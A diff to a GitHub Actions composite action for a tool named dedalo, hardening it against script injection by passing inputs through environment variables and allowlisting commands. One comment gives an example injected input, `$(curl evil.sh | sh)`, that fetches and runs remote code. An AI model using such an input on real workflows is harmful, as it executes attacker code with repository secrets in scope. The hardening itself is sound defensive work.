@@ -53,12 +53,17 @@ outputs:
 runs:
   using: composite
   steps:
+    # Inputs reach the shell through the environment, never through template
+    # expansion. This Action runs in other people's repositories with their
+    # secrets in scope: an `amount` of `$(curl evil.sh | sh)` interpolated into
+    # a run block would execute.
     - name: Check out history if the caller has not
       shell: bash
+      working-directory: ${{ inputs.working-directory }}
       run: |
+        set -euo pipefail
         # Attribution reads merge history: a shallow clone silently produces
         # an empty round rather than an error.
-        cd "${{ inputs.working-directory }}"
         if [ "$(git rev-parse --is-shallow-repository 2>/dev/null)" = "true" ]; then
           echo "::warning title=Shallow clone::dedalo needs full history; fetching it now. Set fetch-depth: 0 on actions/checkout to avoid this."
           git fetch --unshallow --quiet || true
@@ -67,29 +72,53 @@ runs:
     - name: Install dedalo
       shell: bash
       env:
-        DEDALO_VERSION: ${{ inputs.version == 'latest' && '' || inputs.version }}
-        DEDALO_INSTALL: ${{ runner.temp }}/dedalo-bin
+        VERSION: ${{ inputs.version }}
+        ACTION_PATH: ${{ github.action_path }}
       run: |
         set -euo pipefail
-        "${{ github.action_path }}/install.sh"
-        echo "${{ runner.temp }}/dedalo-bin" >> "$GITHUB_PATH"
+        # install.sh resolves the latest release when DEDALO_VERSION is unset.
+        # Expressing that as `version == 'latest' && '' || version` does not
+        # work: '' is falsy, so the fallback fires and the literal string
+        # "latest" is used as a version.
+        if [ "$VERSION" != "latest" ] && [ -n "$VERSION" ]; then
+          export DEDALO_VERSION="$VERSION"
+        fi
+        # Installed under RUNNER_TEMP and invoked by absolute path. Writing to
+        # $GITHUB_PATH would change how every later step in the caller's job
+        # resolves commands, which is more authority than this Action needs.
+        export DEDALO_INSTALL="${RUNNER_TEMP}/dedalo-bin"
+        "${ACTION_PATH}/install.sh"
 
-    - name: Run dedalo ${{ inputs.command }}
+    - name: Run dedalo
       id: run
       shell: bash
       working-directory: ${{ inputs.working-directory }}
+      env:
+        COMMAND: ${{ inputs.command }}
+        AMOUNT: ${{ inputs.amount }}
+        SINCE: ${{ inputs.since }}
+        EXECUTE: ${{ inputs.execute }}
       run: |
         set -euo pipefail
+        dedalo="${RUNNER_TEMP}/dedalo-bin/dedalo"
 
-        args=("${{ inputs.command }}")
-        if [ -n "${{ inputs.amount }}" ]; then
-          args+=(--amount "${{ inputs.amount }}")
+        case "$COMMAND" in
+          status|scan|contributors|plan|settle|ledger) ;;
+          *)
+            echo "::error title=Invalid input::command must be one of status, scan, contributors, plan, settle, ledger (got '$COMMAND')"
+            exit 1
+            ;;
+        esac
+
+        args=("$COMMAND")
+        if [ -n "$AMOUNT" ]; then
+          args+=(--amount "$AMOUNT")
         fi
-        if [ -n "${{ inputs.since }}" ]; then
-          args+=(--since "${{ inputs.since }}")
+        if [ -n "$SINCE" ]; then
+          args+=(--since "$SINCE")
         fi
-        if [ "${{ inputs.execute }}" = "true" ]; then
-          if [ "${{ inputs.command }}" != "settle" ]; then
+        if [ "$EXECUTE" = "true" ]; then
+          if [ "$COMMAND" != "settle" ]; then
             echo "::error title=Invalid input::execute: true only applies to the settle command"
             exit 1
           fi
@@ -98,11 +127,11 @@ runs:
 
         # `settle` has side effects, so it runs exactly once and only in JSON
         # form. The read-only commands can afford a second, prettier pass.
-        if [ "${{ inputs.command }}" != "settle" ]; then
-          dedalo "${args[@]}" | tee "${RUNNER_TEMP}/dedalo-human.txt"
+        if [ "$COMMAND" != "settle" ]; then
+          "$dedalo" "${args[@]}" | tee "${RUNNER_TEMP}/dedalo-human.txt"
         fi
 
-        json=$(dedalo --json "${args[@]}")
+        json=$("$dedalo" --json "${args[@]}")
         printf '%s\n' "$json"
 
         {
@@ -113,19 +142,19 @@ runs:
 
         plan_id=$(printf '%s' "$json" | grep -o '"id": *"[^"]*"' | head -1 | cut -d'"' -f4 || true)
         total=$(printf '%s' "$json" | grep -o '"gross": *"[^"]*"' | head -1 | cut -d'"' -f4 || true)
-        echo "plan-id=${plan_id}" >> "$GITHUB_OUTPUT"
-        echo "total=${total}" >> "$GITHUB_OUTPUT"
+        printf 'plan-id=%s\n' "$plan_id" >> "$GITHUB_OUTPUT"
+        printf 'total=%s\n' "$total" >> "$GITHUB_OUTPUT"
 
     - name: Write the result to the run summary
       if: inputs.summary == 'true'
       shell: bash
       env:
+        COMMAND: ${{ inputs.command }}
         DEDALO_JSON: ${{ steps.run.outputs.json }}
       run: |
         set -euo pipefail
         {
-          echo "## Dedalo — ${{ inputs.command }}"
-          echo
+          printf '## Dedalo — %s\n\n' "$COMMAND"
           echo '```'
           # Reuse what already ran: never invoke the command a second time.
           if [ -s "${RUNNER_TEMP}/dedalo-human.txt" ]; then
